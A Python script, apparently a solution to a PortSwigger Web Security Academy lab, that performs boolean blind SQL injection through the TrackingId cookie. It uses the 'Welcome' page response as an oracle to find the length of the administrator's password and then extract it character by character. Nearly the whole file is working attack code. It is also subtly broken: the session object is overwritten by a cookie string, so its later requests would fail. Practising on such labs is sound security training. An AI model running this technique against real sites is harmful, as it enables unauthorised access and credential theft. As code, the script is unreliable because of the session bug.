import requests

url1 = 'https://0abd00d503ee8eaf800858a1002000e2.web-security-academy.net/'
session = requests.Session()
org_track_id = "JaBSgTTyL7JoUgSD"
char_set = "abcdefghijklmnopqrstuvwxyz0123456789"
session = "HOgsvVVVNQzuTJgeSE8305iIh4ZSg7Oq"
min_pass_length = 1
max_pass_length = 50

cookies = {
    'TrackingId': org_track_id,
    'session': session
}


def stick_to_track_id(cookies, payload):
    cookies['TrackingId'] += "'" + payload + "--"
    return cookies


def welcome_state(res):
    if 'Welcome' in res.text:
        return True
    else :
        return False


def find_password_length(username,cookies, track_id):
    print('Starting to find password length')
    for password in range(min_pass_length, max_pass_length):
        query = f"and (select username from users where username='{username}' and LENGTH(password)>{password})='{username}'"
        print(f"\r\x1b[K: {query}", end="")
        cookies = stick_to_track_id(cookies, query)
        session.cookies.update(cookies)
        response = session.get(url1)
        if welcome_state(response):
            cookies['TrackingId'] = track_id
        else:
            print(f"\nPassword Length:{password}")
            return password


def find_user_password(username, cookies, track_id):
    password_length = find_password_length(username, cookies, track_id)
    print(password_length)
    final_password = ""
    for char_number in range(1,password_length+1):
        for carachter in char_set:
            query = f"and (select substring(password,{char_number},1) from users where username='{username}')='{carachter}'"
            print(f"\r\x1b[KRequested Query = {query}", end="")
            cookies = stick_to_track_id(cookies, query)
            session.cookies.update(cookies)
            response = session.get(url1)
            if not welcome_state(response):
                cookies['TrackingId'] = track_id
            else:
                final_password += carachter
                print(f"Password Founded: {final_password}")
                cookies['TrackingId'] = track_id
                if len(final_password) == password_length :
                    return final_password

find_user_password('administrator', cookies, org_track_id)

